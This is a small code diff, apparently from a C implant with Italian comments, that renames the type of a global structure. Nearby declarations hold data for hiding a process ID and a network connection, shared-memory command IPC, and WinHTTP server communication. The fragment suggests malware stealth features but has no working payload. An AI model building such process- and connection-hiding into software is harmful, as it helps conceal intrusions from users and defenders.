@@ -106,7 +106,7 @@ HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
 ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
 HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
 connection_hide_struct connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
-pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
+PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
 HINTERNET hRequest = 0; // Handle usato dalle winhttp per inviare/ricevere dati
 DWORD pub_key_size = 0; // Dimensione della chiave pubblica nel certificato server
 
